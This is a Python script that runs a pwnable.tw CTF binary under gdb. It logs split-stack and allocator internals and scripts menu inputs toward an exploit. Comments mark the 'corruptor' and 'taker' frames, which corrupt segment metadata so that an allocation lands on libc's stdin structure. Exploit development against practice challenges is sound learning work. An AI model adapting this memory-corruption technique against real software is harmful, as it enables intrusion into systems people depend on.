#!/usr/bin/env python3
import subprocess, sys, time, os

os.chdir('/home/folly/ctf/pwnable.tw/babyalloc')

GDBS = r"""
set pagination off
set confirm off
set debuginfod enabled off
file /home/folly/ctf/pwnable.tw/babyalloc/babyallocator232
set exec-wrapper env LD_LIBRARY_PATH=/home/folly/ctf/pwnable.tw/babyalloc
break *0x400e40
commands
silent
set $pc = *(unsigned long*)$rsp
set $rsp = $rsp + 8
set $rax = 0
continue
end
break *0x401350
commands
silent
printf "GUARDCHK rsp=%p size1=%p guard=%p cur=%p\n", $rsp, $rax, *(unsigned long*)($fs_base+0x70), *(unsigned long*)($fs_base-16)
continue
end
break *0x401362
commands
silent
printf "  HEAPPATH req=%p\n", $rdi
continue
end
break *0x401369
commands
silent
printf "  STACKPATH rsp_after=%p\n", $rsp
continue
end
break *0x4017d0
commands
silent
printf "GENERIC_MORESTACK frame=%p\n", *(unsigned long*)$rdi
continue
end
break *0x401641
commands
silent
printf "  morestack ret=%p\n", $rax
continue
end
break *0x401e30
commands
silent
printf "ALLOCSP size=%p curseg=%p segs=%p\n", $rdi, *(unsigned long*)($fs_base-16), *(unsigned long*)($fs_base-8)
continue
end
break *0x40136f
commands
silent
printf "  BLOCK=%p guard=%p\n", $rax, *(unsigned long*)($fs_base+0x70)
continue
end
break *0x40146a
commands
silent
printf "WRITE ptr=%p size=%d\n", $rdi, $esi
continue
end
break *0x4013a7
commands
silent
printf "SCANRET rsp=%p\n", $rsp
if *(unsigned long*)($fs_base-16) != 0
  set $seg = *(unsigned long*)($fs_base-16)
  printf "HDR %p: prev=%p next=%p size=%p oldstk=%p dyn=%p free=%p\n", $seg, *(unsigned long*)($seg+0), *(unsigned long*)($seg+8), *(unsigned long*)($seg+0x10), *(unsigned long*)($seg+0x18), *(unsigned long*)($seg+0x20), *(unsigned long*)($seg+0x28)
end
continue
end
run
quit
"""
open('gdbscript.txt','w').write(GDBS)

p = subprocess.Popen(['gdb','-q','-batch','-x','gdbscript.txt'],
                     stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT, bufsize=0)

buf = b''
def send(chunk):
    p.stdin.write(chunk)
    p.stdin.flush()

def until(tok, timeout=30):
    global buf
    end = time.time() + timeout
    while time.time() < end:
        while tok in buf:
            i = buf.find(tok)
            out, buf2 = buf[:i+len(tok)], buf[i+len(tok):]
            buf = buf2
            sys.stdout.write(out.decode(errors='replace'))
            return True
        c = os.read(p.stdout.fileno(), 4096)
        if not c: break
        buf += c
    return False

# menu helpers
def alloca_stack(size, name=b'nn'):
    until(b'Your choice:'); send(b'1\n')
    until(b'Size :'); send(b'%d\n' % size)
    until(b'allocator ? :'); send(name + b'\n')

def recurse():
    until(b'Your choice:'); send(b'4\n')

# PHASE 0: initial stack descent
alloca_stack(0xFFF); recurse()   # F1
alloca_stack(0xFFF); recurse()   # F2
alloca_stack(0xFFF); recurse()   # F3
alloca_stack(0xA00); recurse()   # F4
alloca_stack(0x210); recurse()   # F5
alloca_stack(0x400); recurse()   # F6 heap
alloca_stack(0x400); recurse()   # F7
alloca_stack(0x400); recurse()   # F8
alloca_stack(0x400); recurse()   # F9
alloca_stack(0x400); recurse()   # F10 -> F11 enters S1
# PHASE 1: S1 descent
alloca_stack(0x700); recurse()   # F11 (on S1): buffer at B+0x878 -> F12 = B+0x838
# F12: THE CORRUPTOR (heap path)
alloca_stack(0x300)              # scanf at rsp=B+0x838 -> free(+0x28) = &stdin
recurse()                        # F13 = B+0x7f8
# F13: THE TAKER
alloca_stack(0xFFF)              # block = stdin+0x84 -> ptr_1 = stdin+0x90
# write something small first to see ptr
until(b'Your choice:'); send(b'3\n')
until(b'Content :'); send(b'A'*0x40)
# release everything
until(b'Your choice:'); send(b'5\n')
until(b'Your choice:'); send(b'5\n')
time.sleep(3)
try:
    while True:
        c = os.read(p.stdout.fileno(), 4096)
        if not c: break
        buf += c
except Exception:
    pass
sys.stdout.write(buf.decode(errors='replace')[-3000:])
p.wait()
